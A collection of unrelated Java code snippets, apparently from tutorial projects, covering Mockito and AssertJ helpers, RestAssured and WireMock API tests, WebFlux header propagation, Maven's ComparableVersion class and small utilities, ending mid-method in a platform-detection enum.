    public PersonAssert hasNickname(String nickName) {
        isNotNull();
        if (!actual.getNicknames().contains(nickName)) {
            failWithMessage("Expected person to have nickname %s", nickName);
        }
        return this;
    }
}
-----------------------------------------------------------------------------------------
MockSettings customSettings = withSettings().defaultAnswer(new CustomAnswer());
MyList listMock = mock(MyList.class, customSettings);

   @Mock(answer = Answers.RETURNS_DEEP_STUBS)
    private PizzaBuilder anotherbuilder;
	
	import org.junit.Test;
import org.mockito.exceptions.base.MockitoAssertionError;
import org.mockito.junit.MockitoJUnit;
import org.mockito.junit.VerificationCollector;

import java.util.List;

import static org.junit.Assert.assertTrue;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verify;

public class LazyVerificationUnitTest {

    @Test
    public void whenLazilyVerified_thenReportsMultipleFailures() {
        VerificationCollector collector = MockitoJUnit.collector()
            .assertLazily();

        List mockList = mock(List.class);
        verify(mockList).add("one");
        verify(mockList).clear();

        try {
            collector.collectAndReport();
        } catch (MockitoAssertionError error) {
            assertTrue(error.getMessage()
                .contains("1. Wanted but not invoked:"));
            assertTrue(error.getMessage()
                .contains("2. Wanted but not invoked:"));
        }
    }
}

         Mockito.doReturn(100, Mockito.withSettings().lenient())
                .when(list)
                .size();
				
    private void verifyPostRequest() {
        new MockServerClient("localhost", 1080).verify(
                request()
                        .withMethod("POST")
                        .withPath("/validate")
                        .withBody(exact("{username: 'foo', password: 'bar'}")),
                VerificationTimes.exactly(1)
        );
    }
    private void verifyGetRequest() {
        new MockServerClient("localhost", 1080).verify(
                request()
                        .withMethod("GET")
                        .withPath("/index.html"),
                VerificationTimes.exactly(1)
        );
    }
-----------------------------------------------------------------------------------------
import com.github.tomakehurst.wiremock.WireMockServer;
import io.restassured.RestAssured;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import static com.github.tomakehurst.wiremock.client.WireMock.aResponse;
import static com.github.tomakehurst.wiremock.client.WireMock.configureFor;
import static com.github.tomakehurst.wiremock.client.WireMock.post;
import static com.github.tomakehurst.wiremock.client.WireMock.stubFor;
import static com.github.tomakehurst.wiremock.client.WireMock.urlEqualTo;
import static io.restassured.RestAssured.post;
import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.equalTo;
import static org.hamcrest.xml.HasXPath.hasXPath;

public class RestAssuredXMLIntegrationTest {
    private static final int PORT = 8081;
    private static WireMockServer wireMockServer = new WireMockServer(PORT);

    private static final String EVENTS_PATH = "/employees";
    private static final String APPLICATION_XML = "application/xml";
    private static final String EMPLOYEES = getXml();

    @BeforeClass
    public static void before() throws Exception {
        System.out.println("Setting up!");
        wireMockServer.start();
        configureFor("localhost", PORT);
        RestAssured.port = PORT;
        stubFor(post(urlEqualTo(EVENTS_PATH)).willReturn(
          aResponse().withStatus(200)
            .withHeader("Content-Type", APPLICATION_XML)
            .withBody(EMPLOYEES)));
    }

    @Test
    public void givenUrl_whenXmlResponseValueTestsEqual_thenCorrect() {
        post("/employees").then().assertThat()
          .body("employees.employee.first-name", equalTo("Jane"));
    }

    @Test
    public void givenUrl_whenMultipleXmlValuesTestEqual_thenCorrect() {
        post("/employees").then().assertThat()
          .body("employees.employee.first-name", equalTo("Jane"))
          .body("employees.employee.last-name", equalTo("Daisy"))
          .body("employees.employee.sex", equalTo("f"));
    }

    @Test
    public void givenUrl_whenMultipleXmlValuesTestEqualInShortHand_thenCorrect() {
        post("/employees")
          .then()
          .assertThat()
          .body("employees.employee.first-name", equalTo("Jane"),
            "employees.employee.last-name", equalTo("Daisy"),
            "employees.employee.sex", equalTo("f"));
    }

    @Test
    public void givenUrl_whenValidatesXmlUsingXpath_thenCorrect() {
        post("/employees")
          .then()
          .assertThat()
          .body(hasXPath("/employees/employee/first-name",
            containsString("Ja")));
    }

    @Test
    public void givenUrl_whenValidatesXmlUsingXpath2_thenCorrect() {
        post("/employees")
          .then()
          .assertThat()
          .body(hasXPath("/employees/employee/first-name[text()='Jane']"));
    }

    private static String getXml() {
        return Util
          .inputStreamToString(RestAssuredXMLIntegrationTest.class.getResourceAsStream("/employees.xml"));
    }

    @AfterClass
    public static void after() throws Exception {
        System.out.println("Running: tearDown");
        wireMockServer.stop();
    }
}

import com.github.fge.jsonschema.SchemaVersion;
import com.github.fge.jsonschema.cfg.ValidationConfiguration;
import com.github.fge.jsonschema.main.JsonSchemaFactory;
import com.github.tomakehurst.wiremock.WireMockServer;
import io.restassured.RestAssured;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;

import static com.github.tomakehurst.wiremock.client.WireMock.aResponse;
import static com.github.tomakehurst.wiremock.client.WireMock.configureFor;
import static com.github.tomakehurst.wiremock.client.WireMock.get;
import static com.github.tomakehurst.wiremock.client.WireMock.stubFor;
import static com.github.tomakehurst.wiremock.client.WireMock.urlEqualTo;
import static io.restassured.RestAssured.get;
import static io.restassured.module.jsv.JsonSchemaValidator.matchesJsonSchemaInClasspath;
import static io.restassured.module.jsv.JsonSchemaValidatorSettings.settings;
import static org.hamcrest.Matchers.equalTo;
import static org.hamcrest.Matchers.hasItems;

public class RestAssuredIntegrationTest {
    private static final int PORT = 8083;
    private static WireMockServer wireMockServer = new WireMockServer(PORT);

    private static final String EVENTS_PATH = "/events?id=390";
    private static final String APPLICATION_JSON = "application/json";
    private static final String GAME_ODDS = getEventJson();

    @BeforeClass
    public static void before() throws Exception {
        System.out.println("Setting up!");
        wireMockServer.start();
        RestAssured.port = PORT;
        configureFor("localhost", PORT);
        stubFor(get(urlEqualTo(EVENTS_PATH)).willReturn(
          aResponse().withStatus(200)
            .withHeader("Content-Type", APPLICATION_JSON)
            .withBody(GAME_ODDS)));
    }

    @Test
    public void givenUrl_whenCheckingFloatValuePasses_thenCorrect() {
        get("/events?id=390").then().assertThat()
          .body("odd.ck", equalTo(12.2f));
    }

    @Test
    public void givenUrl_whenSuccessOnGetsResponseAndJsonHasRequiredKV_thenCorrect() {

        get("/events?id=390").then().statusCode(200).assertThat()
          .body("id", equalTo("390"));
    }

    @Test
    public void givenUrl_whenJsonResponseHasArrayWithGivenValuesUnderKey_thenCorrect() {
        get("/events?id=390").then().assertThat()
          .body("odds.price", hasItems("1.30", "5.25", "2.70", "1.20"));
    }

    @Test
    public void givenUrl_whenJsonResponseConformsToSchema_thenCorrect() {

        get("/events?id=390").then().assertThat()
          .body(matchesJsonSchemaInClasspath("event_0.json"));
    }

    @Test
    public void givenUrl_whenValidatesResponseWithInstanceSettings_thenCorrect() {
        JsonSchemaFactory jsonSchemaFactory = JsonSchemaFactory
          .newBuilder()
          .setValidationConfiguration(
            ValidationConfiguration.newBuilder()
              .setDefaultVersion(SchemaVersion.DRAFTV4)
              .freeze()).freeze();

        get("/events?id=390")
          .then()
          .assertThat()
          .body(matchesJsonSchemaInClasspath("event_0.json").using(
            jsonSchemaFactory));
    }

    @Test
    public void givenUrl_whenValidatesResponseWithStaticSettings_thenCorrect() {

        get("/events?id=390")
          .then()
          .assertThat()
          .body(matchesJsonSchemaInClasspath("event_0.json").using(
            settings().with().checkedValidation(false)));
    }

    @AfterClass
    public static void after() throws Exception {
        System.out.println("Running: tearDown");
        wireMockServer.stop();
    }

    private static String getEventJson() {
        return Util.inputStreamToString(RestAssuredIntegrationTest.class
          .getResourceAsStream("/event_0.json"));
    }
}

import static io.restassured.RestAssured.given;
import static io.restassured.RestAssured.when;
import static org.hamcrest.Matchers.greaterThan;
import static org.hamcrest.Matchers.is;
import static org.hamcrest.Matchers.lessThan;
import static org.junit.Assert.assertEquals;
import io.restassured.RestAssured;
import io.restassured.http.Cookie;
import io.restassured.response.Response;

import java.util.concurrent.TimeUnit;

import org.junit.Before;
import org.junit.Test;

public class RestAssuredAdvancedLiveTest {
    
    @Before
    public void setup(){
        RestAssured.baseURI = "https://api.github.com";
        RestAssured.port = 443;
    }
    
    @Test
    public void whenMeasureResponseTime_thenOK(){
        Response response = RestAssured.get("/users/eugenp");
        long timeInMS = response.time();
        long timeInS = response.timeIn(TimeUnit.SECONDS);
        
        assertEquals(timeInS, timeInMS/1000);
    }
    
    @Test
    public void whenValidateResponseTime_thenSuccess(){
        when().get("/users/eugenp").then().time(lessThan(5000L));
    }

    @Test
    public void whenValidateResponseTimeInSeconds_thenSuccess(){
        when().get("/users/eugenp").then().time(lessThan(5L),TimeUnit.SECONDS);
    }
    
    //===== parameter
    
    @Test
    public void whenUseQueryParam_thenOK(){
        given().queryParam("q", "john").when().get("/search/users").then().statusCode(200);
        given().param("q", "john").when().get("/search/users").then().statusCode(200);
    }
    
    @Test
    public void whenUseMultipleQueryParam_thenOK(){
        int perPage = 20;
        given().queryParam("q", "john").queryParam("per_page",perPage).when().get("/search/users").then().body("items.size()", is(perPage));        
        given().queryParams("q", "john","per_page",perPage).when().get("/search/users").then().body("items.size()", is(perPage));
    }
    
    @Test
    public void whenUseFormParam_thenSuccess(){
        given().log().all().formParams("username", "john","password","1234").post("/");
        given().log().all().params("username", "john","password","1234").post("/");
    }
    
    @Test
    public void whenUsePathParam_thenOK(){
        given().pathParam("user", "eugenp").when().get("/users/{user}/repos").then().log().all().statusCode(200);
    }
    
    @Test
    public void whenUseMultiplePathParam_thenOK(){
        given().log().all().pathParams("owner", "eugenp","repo","tutorials").when().get("/repos/{owner}/{repo}").then().statusCode(200);
        given().log().all().pathParams("owner", "eugenp").when().get("/repos/{owner}/{repo}","tutorials").then().statusCode(200);
    }
    
    //===== header
    
    @Test
    public void whenUseCustomHeader_thenOK(){
        given().header("User-Agent", "MyAppName").when().get("/users/eugenp").then().statusCode(200);
    }
    
    @Test
    public void whenUseMultipleHeaders_thenOK(){
        given().header("User-Agent", "MyAppName","Accept-Charset","utf-8").when().get("/users/eugenp").then().statusCode(200);
    }    
    
    //======= cookie
    
    @Test
    public void whenUseCookie_thenOK(){
        given().cookie("session_id", "1234").when().get("/users/eugenp").then().statusCode(200);
    }
    
    @Test
    public void whenUseCookieBuilder_thenOK(){
        Cookie myCookie = new Cookie.Builder("session_id", "1234").setSecured(true).setComment("session id cookie").build();
        given().cookie(myCookie).when().get("/users/eugenp").then().statusCode(200);
    }
    
    // ====== request
    
    @Test
    public void whenRequestGet_thenOK(){
        when().request("GET", "/users/eugenp").then().statusCode(200);
    }
    
    @Test
    public void whenRequestHead_thenOK(){
        when().request("HEAD", "/users/eugenp").then().statusCode(200);
    }
    
    //======= log
    
    @Test
    public void whenLogRequest_thenOK(){
        given().log().all().when().get("/users/eugenp").then().statusCode(200);
    }
    
    @Test
    public void whenLogResponse_thenOK(){
        when().get("/repos/eugenp/tutorials").then().log().body().statusCode(200);
    }
    
    @Test
    public void whenLogResponseIfErrorOccurred_thenSuccess(){
        when().get("/users/eugenp").then().log().ifError();
        when().get("/users/eugenp").then().log().ifStatusCodeIsEqualTo(500);
        when().get("/users/eugenp").then().log().ifStatusCodeMatches(greaterThan(200));
    }
    
    @Test
    public void whenLogOnlyIfValidationFailed_thenSuccess(){
        when().get("/users/eugenp").then().log().ifValidationFails().statusCode(200);
        given().log().ifValidationFails().when().get("/users/eugenp").then().statusCode(200);
    }
   
}

import com.github.tomakehurst.wiremock.WireMockServer;
import io.restassured.RestAssured;
import org.junit.AfterClass;
import org.junit.BeforeClass;
import org.junit.Test;
import static com.github.tomakehurst.wiremock.client.WireMock.aResponse;
import static com.github.tomakehurst.wiremock.client.WireMock.configureFor;
import static com.github.tomakehurst.wiremock.client.WireMock.containing;
import static com.github.tomakehurst.wiremock.client.WireMock.get;
import static com.github.tomakehurst.wiremock.client.WireMock.post;
import static com.github.tomakehurst.wiremock.client.WireMock.stubFor;
import static com.github.tomakehurst.wiremock.client.WireMock.urlEqualTo;
import static io.restassured.RestAssured.get;
import static io.restassured.RestAssured.with;
import static org.hamcrest.Matchers.hasItems;

public class RestAssured2IntegrationTest {
    private static final int PORT = 8084;
    private static WireMockServer wireMockServer = new WireMockServer(PORT);

    private static final String EVENTS_PATH = "/odds";
    private static final String APPLICATION_JSON = "application/json";
    private static final String ODDS = getJson();

    @BeforeClass
    public static void before() throws Exception {
        System.out.println("Setting up!");
        wireMockServer.start();
        configureFor("localhost", PORT);
        RestAssured.port = PORT;
        stubFor(get(urlEqualTo(EVENTS_PATH)).willReturn(
          aResponse().withStatus(200)
            .withHeader("Content-Type", APPLICATION_JSON)
            .withBody(ODDS)));
        stubFor(post(urlEqualTo("/odds/new"))
            .withRequestBody(containing("{\"price\":5.25,\"status\":1,\"ck\":13.1,\"name\":\"X\"}"))
            .willReturn(aResponse().withStatus(201)));
    }

    @Test
    public void givenUrl_whenVerifiesOddPricesAccuratelyByStatus_thenCorrect() {
        get("/odds").then().body("odds.findAll { it.status > 0 }.price",
          hasItems(5.25f, 1.2f));
    }

    @Test
    public void whenRequestedPost_thenCreated() {
        with().body(new Odd(5.25f, 1, 13.1f, "X"))
            .when()
            .request("POST", "/odds/new")
            .then()
            .statusCode(201);
    }

    private static String getJson() {
        return Util.inputStreamToString(RestAssured2IntegrationTest.class
          .getResourceAsStream("/odds.json"));
    }

    @AfterClass
    public static void after() throws Exception {
        System.out.println("Running: tearDown");
        wireMockServer.stop();
    }
}

import static io.restassured.RestAssured.get;
import static io.restassured.RestAssured.given;

import org.junit.jupiter.api.Test;
import org.springframework.http.HttpStatus;

/**
 * For this Live Test we need:
 * * a running instance of the service located in the spring-security-rest-basic-auth module.
 * @see <a href="https://github.com/eugenp/tutorials/tree/master/spring-security-rest-basic-auth">spring-security-rest-basic-auth module</a>
 * 
 */
public class BasicAuthenticationLiveTest {

    private static final String USER = "user1";
    private static final String PASSWORD = "user1Pass";
    private static final String SVC_URL = "http://localhost:8080/spring-security-rest-basic-auth/api/foos/1";

    @Test
    public void givenNoAuthentication_whenRequestSecuredResource_thenUnauthorizedResponse() {
        get(SVC_URL).then()
            .assertThat()
            .statusCode(HttpStatus.UNAUTHORIZED.value());
    }

    @Test
    public void givenBasicAuthentication_whenRequestSecuredResource_thenResourceRetrieved() {
        given().auth()
            .basic(USER, PASSWORD)
            .when()
            .get(SVC_URL)
            .then()
            .assertThat()
            .statusCode(HttpStatus.OK.value());
    }
}


import static io.restassured.RestAssured.get;
import static io.restassured.RestAssured.given;
import static org.hamcrest.Matchers.hasKey;

import org.junit.jupiter.api.Test;
import org.springframework.http.HttpStatus;

/**
 * For this Live Test we need:
 * * a running instance of the authorization server located in the spring-security-oauth repo - oauth-authorization-server module.
 * @see <a href="https://github.com/Baeldung/spring-security-oauth/tree/master/oauth-authorization-server">spring-security-oauth/oauth-authorization-server module</a>
 * 
 * * a running instance of the service located in the spring-security-oauth repo - oauth-resource-server-1 module.
 * @see <a href="https://github.com/Baeldung/spring-security-oauth/tree/master/oauth-resource-server-1">spring-security-oauth/oauth-resource-server-1 module</a>
 * 
 */
public class OAuth2AuthenticationLiveTest {

    private static final String USER = "john";
    private static final String PASSWORD = "123";
    private static final String CLIENT_ID = "fooClientIdPassword";
    private static final String SECRET = "secret";
    private static final String AUTH_SVC_TOKEN_URL = "http://localhost:8081/spring-security-oauth-server/oauth/token";
    private static final String RESOURCE_SVC_URL = "http://localhost:8082/spring-security-oauth-resource/foos/1";

    @Test
    public void givenNoAuthentication_whenRequestSecuredResource_thenUnauthorizedResponse() {
        get(RESOURCE_SVC_URL).then()
            .assertThat()
            .statusCode(HttpStatus.UNAUTHORIZED.value());
    }

    @Test
    public void givenAccessTokenAuthentication_whenRequestSecuredResource_thenResourceRetrieved() {
        String accessToken = given().auth()
            .basic(CLIENT_ID, SECRET)
            .formParam("grant_type", "password")
            .formParam("username", USER)
            .formParam("password", PASSWORD)
            .formParam("scope", "read foo")
            .when()
            .post(AUTH_SVC_TOKEN_URL)
            .then()
            .assertThat()
            .statusCode(HttpStatus.OK.value())
            .extract()
            .path("access_token");

        given().auth()
            .oauth2(accessToken)
            .when()
            .get(RESOURCE_SVC_URL)
            .then()
            .assertThat()
            .statusCode(HttpStatus.OK.value())
            .body("$", hasKey("id"))
            .body("$", hasKey("name"));
    }
}
-----------------------------------------------------------------------------------------
import org.junit.jupiter.api.extension.ConditionEvaluationResult;
import org.junit.jupiter.api.extension.ExecutionCondition;
import org.junit.jupiter.api.extension.ExtensionContext;
import java.util.Optional;
public class DemoExecutionConditionExtension implements ExecutionCondition {
    @Override
    public ConditionEvaluationResult evaluateExecutionCondition(ExtensionContext extensionContext) {
        String env = System.getProperty("env");
        return Optional.ofNullable(env)
                .filter(s -> !s.equalsIgnoreCase("dev"))
                .map(s -> ConditionEvaluationResult.enabled("enabled for env "+env))
                .orElse(ConditionEvaluationResult.disabled("disabled for env " + env));
    }

-----------------------------------------------------------------------------------------
@Component
public class HeaderContextFilter implements WebFilter {
    private final List<String> headers;
    public HeaderContextFilter(DemoProperties demoProperties) {
    // 2)   
        headers = demoProperties.getHeaders();
    }
    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        return chain.filter(exchange)
                .subscriberContext(context -> {
                    Map<String, String> headerMap = new HashMap<>();
                    // 3)
                    headers.forEach(header -> headerMap.put(header, exchange.getRequest().getHeaders().getFirst(header)));
                    // 4)
                    context = context.put("headers", headerMap);
                    return context;
                });
    }
}

@Bean
public WebClient webClient(DemoProperties demoProperties, HeaderExchange headerExchange) {
    return WebClient
            .builder()
            .filter(headerExchange)
            .baseUrl(demoProperties.getBackendUri())
            .build();
}

@Component
public class HeaderExchange implements ExchangeFilterFunction {
    private List<String> headers;
    public HeaderExchange(DemoProperties demoProperties) {
        this.headers = demoProperties.getHeaders();
    }
    @Override
    public Mono<ClientResponse> filter(ClientRequest clientRequest, ExchangeFunction exchangeFunction) {
        return Mono.subscriberContext()
                .flatMap(context -> {
                    // 1)
                    Map<String, String> headerMap = context.get("headers");
                    // 2)
                    ClientRequest newRequest = ClientRequest
                            .from(clientRequest)
                            .headers(httpHeaders -> 
// 3)
headers.forEach(header -> httpHeaders.add(header, headerMap.get(header))))
                            .build();
                    return exchangeFunction.exchange(newRequest);
                });
    }
}
-----------------------------------------------------------------------------------------
import org.testng.ITestContext;
import org.testng.ITestListener;
import org.testng.ITestResult;

import java.util.Arrays;
import java.util.List;
import java.util.Objects;
import java.util.Optional;

public class TestNGLogCollector implements ITestListener {

    private static CollectorImpl collector;

    private static Object logger;

    public static void setLogSource(Object logger) {
        TestNGLogCollector.logger = Objects.requireNonNull(logger);
    }

    protected void before() {
        collector = Arrays.stream(Frameworks.values())
                .map(v -> v.getCollector(logger))
                .filter(Optional::isPresent)
                .map(Optional::get)
                .findFirst()
                .orElseThrow(() -> new RuntimeException("Unknown logger " + logger.getClass()));

        collector.setup();
    }

    protected void after() {
        if (collector != null) {
            collector.remove();
            collector = null;
        }
    }

    public static List<String> getLogs() {
        return collector.getResult();
    }

    public static List<?> getRawLogs() {
        return collector.getRawLogs();
    }


    @Override
    public void onTestStart(ITestResult result) {
        before();
    }

    @Override
    public void onTestSuccess(ITestResult result) {
        after();
    }

    @Override
    public void onTestFailure(ITestResult result) {
        after();
    }

    @Override
    public void onTestFailedButWithinSuccessPercentage(ITestResult result) {
        after();
    }

    @Override
    public void onTestSkipped(ITestResult result) {}

    @Override
    public void onStart(ITestContext context) {}

    @Override
    public void onFinish(ITestContext context) {}
}
-----------------------------------------------------------------------------------------
public class ComparableVersion
    implements Comparable<ComparableVersion>
{
    private String value;

    private String canonical;

    private ListItem items;

    interface Item
    {
        int INTEGER_ITEM = 0;

        int STRING_ITEM = 1;

        int LIST_ITEM = 2;

        int compareTo( Item item );

        int getType();

        boolean isNull();
    }

    /**
     * Represents a numeric item in the version item list.
     */
    static class IntegerItem
        implements Item
    {
        private static final BigInteger BIG_INTEGER_ZERO = new BigInteger( "0" );

        private final BigInteger value;

        public static final IntegerItem ZERO = new IntegerItem();

        private IntegerItem()
        {
            this.value = BIG_INTEGER_ZERO;
        }

        public IntegerItem( String str )
        {
            this.value = new BigInteger( str );
        }

        public int getType()
        {
            return INTEGER_ITEM;
        }

        public boolean isNull()
        {
            return BIG_INTEGER_ZERO.equals( value );
        }

        public int compareTo( Item item )
        {
            if ( item == null )
            {
                return BIG_INTEGER_ZERO.equals( value ) ? 0 : 1; // 1.0 == 1, 1.1 > 1
            }

            switch ( item.getType() )
            {
                case INTEGER_ITEM:
                    return value.compareTo( ( (IntegerItem) item ).value );

                case STRING_ITEM:
                    return 1; // 1.1 > 1-sp

                case LIST_ITEM:
                    return 1; // 1.1 > 1-1

                default:
                    throw new RuntimeException( "invalid item: " + item.getClass() );
            }
        }

        public String toString()
        {
            return value.toString();
        }
    }

    /**
     * Represents a string in the version item list, usually a qualifier.
     */
    static class StringItem
        implements Item
    {
        private static final List<String> QUALIFIERS =
            Arrays.asList( "alpha", "beta", "milestone", "rc", "snapshot", "", "sp" );

        private static final Properties ALIASES = new Properties();
        static
        {
            ALIASES.put( "ga", "" );
            ALIASES.put( "final", "" );
            ALIASES.put( "cr", "rc" );
        }

        /**
         * A comparable value for the empty-string qualifier. This one is used to determine if a given qualifier makes
         * the version older than one without a qualifier, or more recent.
         */
        private static final String RELEASE_VERSION_INDEX = String.valueOf( QUALIFIERS.indexOf( "" ) );

        private String value;

        public StringItem( String value, boolean followedByDigit )
        {
            if ( followedByDigit && value.length() == 1 )
            {
                // a1 = alpha-1, b1 = beta-1, m1 = milestone-1
                switch ( value.charAt( 0 ) )
                {
                    case 'a':
                        value = "alpha";
                        break;
                    case 'b':
                        value = "beta";
                        break;
                    case 'm':
                        value = "milestone";
                        break;
                    default:
                }
            }
            this.value = ALIASES.getProperty( value, value );
        }

        public int getType()
        {
            return STRING_ITEM;
        }

        public boolean isNull()
        {
            return ( comparableQualifier( value ).compareTo( RELEASE_VERSION_INDEX ) == 0 );
        }

        /**
         * Returns a comparable value for a qualifier. This method takes into account the ordering of known qualifiers
         * then unknown qualifiers with lexical ordering. just returning an Integer with the index here is faster, but
         * requires a lot of if/then/else to check for -1 or QUALIFIERS.size and then resort to lexical ordering. Most
         * comparisons are decided by the first character, so this is still fast. If more characters are needed then it
         * requires a lexical sort anyway.
         *
         * @param qualifier
         * @return an equivalent value that can be used with lexical comparison
         */
        public static String comparableQualifier( String qualifier )
        {
            int i = QUALIFIERS.indexOf( qualifier );

            return i == -1 ? ( QUALIFIERS.size() + "-" + qualifier ) : String.valueOf( i );
        }

        public int compareTo( Item item )
        {
            if ( item == null )
            {
                // 1-rc < 1, 1-ga > 1
                return comparableQualifier( value ).compareTo( RELEASE_VERSION_INDEX );
            }
            switch ( item.getType() )
            {
                case INTEGER_ITEM:
                    return -1; // 1.any < 1.1 ?

                case STRING_ITEM:
                    return comparableQualifier( value ).compareTo( comparableQualifier( ( (StringItem) item ).value ) );

                case LIST_ITEM:
                    return -1; // 1.any < 1-1

                default:
                    throw new RuntimeException( "invalid item: " + item.getClass() );
            }
        }

        public String toString()
        {
            return value;
        }
    }

    /**
     * Represents a version list item. This class is used both for the global item list and for sub-lists (which start
     * with '-(number)' in the version specification).
     */
    public static class ListItem
        extends ArrayList<Item>
        implements Item
    {
        public int getType()
        {
            return LIST_ITEM;
        }

        public boolean isNull()
        {
            return ( size() == 0 );
        }

        void normalize()
        {
            for ( int i = size() - 1; i >= 0; i-- )
            {
                Item lastItem = get( i );

                if ( lastItem.isNull() )
                {
                    // remove null trailing items: 0, "", empty list
                    remove( i );
                }
                else if ( !( lastItem instanceof ListItem ) )
                {
                    break;
                }
            }
        }

        public int compareTo( Item item )
        {
            if ( item == null )
            {
                if ( size() == 0 )
                {
                    return 0; // 1-0 = 1- (normalize) = 1
                }
                Item first = get( 0 );
                return first.compareTo( null );
            }
            switch ( item.getType() )
            {
                case INTEGER_ITEM:
                    return -1; // 1-1 < 1.0.x

                case STRING_ITEM:
                    return 1; // 1-1 > 1-sp

                case LIST_ITEM:
                    Iterator<Item> left = iterator();
                    Iterator<Item> right = ( (ListItem) item ).iterator();

                    while ( left.hasNext() || right.hasNext() )
                    {
                        Item l = left.hasNext() ? left.next() : null;
                        Item r = right.hasNext() ? right.next() : null;

                        // if this is shorter, then invert the compare and mul with -1
                        int result = l == null ? ( r == null ? 0 : -1 * r.compareTo( l ) ) : l.compareTo( r );

                        if ( result != 0 )
                        {
                            return result;
                        }
                    }

                    return 0;

                default:
                    throw new RuntimeException( "invalid item: " + item.getClass() );
            }
        }

        public String toString()
        {
            StringBuilder buffer = new StringBuilder();
            for ( Item item : this )
            {
                if ( buffer.length() > 0 )
                {
                    buffer.append( ( item instanceof ListItem ) ? '-' : '.' );
                }
                buffer.append( item );
            }
            return buffer.toString();
        }
    }

    public ComparableVersion( String version )
    {
        parseVersion( version );
    }

    public final void parseVersion( String version )
    {
        this.value = version;

        items = new ListItem();

        version = version.toLowerCase( Locale.ENGLISH );

        ListItem list = items;

        Stack<Item> stack = new Stack<>();
        stack.push( list );

        boolean isDigit = false;

        int startIndex = 0;

        for ( int i = 0; i < version.length(); i++ )
        {
            char c = version.charAt( i );

            if ( c == '.' )
            {
                if ( i == startIndex )
                {
                    list.add( IntegerItem.ZERO );
                }
                else
                {
                    list.add( parseItem( isDigit, version.substring( startIndex, i ) ) );
                }
                startIndex = i + 1;
            }
            else if ( c == '-' )
            {
                if ( i == startIndex )
                {
                    list.add( IntegerItem.ZERO );
                }
                else
                {
                    list.add( parseItem( isDigit, version.substring( startIndex, i ) ) );
                }
                startIndex = i + 1;

                list.add( list = new ListItem() );
                stack.push( list );
            }
            else if ( Character.isDigit( c ) )
            {
                if ( !isDigit && i > startIndex )
                {
                    list.add( new StringItem( version.substring( startIndex, i ), true ) );
                    startIndex = i;

                    list.add( list = new ListItem() );
                    stack.push( list );
                }

                isDigit = true;
            }
            else
            {
                if ( isDigit && i > startIndex )
                {
                    list.add( parseItem( true, version.substring( startIndex, i ) ) );
                    startIndex = i;

                    list.add( list = new ListItem() );
                    stack.push( list );
                }

                isDigit = false;
            }
        }

        if ( version.length() > startIndex )
        {
            list.add( parseItem( isDigit, version.substring( startIndex ) ) );
        }

        while ( !stack.isEmpty() )
        {
            list = (ListItem) stack.pop();
            list.normalize();
        }

        canonical = items.toString();
    }

    private static Item parseItem( boolean isDigit, String buf )
    {
        return isDigit ? new IntegerItem( buf ) : new StringItem( buf, false );
    }

    public int compareTo( ComparableVersion o )
    {
        return items.compareTo( o.items );
    }

    public String toString()
    {
        return value;
    }

    public String getCanonical()
    {
        return canonical;
    }

    public boolean equals( Object o )
    {
        return ( o instanceof ComparableVersion ) && canonical.equals( ( (ComparableVersion) o ).canonical );
    }

    public int hashCode()
    {
        return canonical.hashCode();
    }

    public ListItem getItems()
    {
        return this.items;
    }

    /**
     * Main to test version parsing and comparison.
     *
     * @param args the version strings to parse and compare
     */
    public static void main( String... args )
    {
        System.out.println( "Display parameters as parsed by Maven (in canonical form) and comparison result:" );
        if ( args.length == 0 )
        {
            return;
        }

        ComparableVersion prev = null;
        int i = 1;
        for ( String version : args )
        {
            ComparableVersion c = new ComparableVersion( version );

            if ( prev != null )
            {
                int compare = prev.compareTo( c );
                System.out.println( "   " + prev.toString() + ' '
                    + ( ( compare == 0 ) ? "==" : ( ( compare < 0 ) ? "<" : ">" ) ) + ' ' + version );
            }

            System.out.println( String.valueOf( i++ ) + ". " + version + " == " + c.getCanonical() );

            prev = c;
        }
    }
}


import org.apache.http.HttpResponse;
import org.apache.http.client.HttpResponseException;

public class HttpResponseValidator {

    public void validateResponse(HttpResponse response) throws HttpResponseException {
        int status = response.getStatusLine().getStatusCode();
        if (status < 200 || status >= 400) {
            throw new HttpResponseException(status, response.getStatusLine().getReasonPhrase());
        }
    }
}

import com.google.common.net.UrlEscapers;

public final class EncodingUtils {

    private EncodingUtils() {
    } // nope

    public static String encode(String pathPart) {
        // jenkins doesn't like the + for space, use %20 instead
        String escape = UrlEscapers.urlPathSegmentEscaper().escape(pathPart);
        return escape;
    }

    public static String encodeParam(String pathPart) {
        // jenkins doesn't like the + for space, use %20 instead
        return UrlEscapers.urlFormParameterEscaper().escape(pathPart);
    }

}
-----------------------------------------------------------------------------------------
public static short[] toShortArray(IntStream is) {
    Spliterator.OfInt sp = is.spliterator();
    long l=sp.getExactSizeIfKnown();
    if(l>=0) {
        if(l>Integer.MAX_VALUE) throw new OutOfMemoryError();
        short[] array=new short[(int)l];
        sp.forEachRemaining(new IntConsumer() {
            int ix;
            public void accept(int value) {
                array[ix++]=(short)value;
            }
        });
        return array;
    }
    final class ShortCollector implements IntConsumer {
        int bufIx, currIx, total;
        short[][] buffer=new short[25][];
        short[] current=buffer[0]=new short[64];

        public void accept(int value) {
            int ix = currIx;
            if(ix==current.length) {
                current=buffer[++bufIx]=new short[ix*2];
                total+=ix;
                ix=0;
            }
            current[ix]=(short)value;
            currIx=ix+1;
        }
        short[] toArray() {
            if(bufIx==0)
                return currIx==current.length? current: Arrays.copyOf(current, currIx);
            int p=0;
            short[][] buf=buffer;
            short[] result=new short[total+currIx];
            for(int bIx=0, e=bufIx, l=buf[0].length; bIx<e; bIx++, p+=l, l+=l)
                System.arraycopy(buf[bIx], 0, result, p, l);
            System.arraycopy(current, 0, result, p, currIx);
            return result;
        }
    }
    ShortCollector c=new ShortCollector();
    sp.forEachRemaining(c);
    return c.toArray();
}
-----------------------------------------------------------------------------------------
$ mvn release:prepare -DautoVersionSubmodules=true
$ mvn release:perform
-----------------------------------------------------------------------------------------
sudo ifconfig lo0 alias 127.0.0.2
-----------------------------------------------------------------------------------------
public enum Platform {
	Linux, Windows, OS_X, Solaris, FreeBSD;

	public static Platform detect() {
		String osName = System.getProperty("os.name");
		if (osName.equals("Linux"))
			return Linux;
		if (osName.startsWith("Windows", 0))
			return Windows;
		if (osName.equals("Mac OS X"))
			return OS_X;
		if (osName.contains("SunOS"))
			return Solaris;
		if (osName.equals("FreeBSD"))
			return FreeBSD;
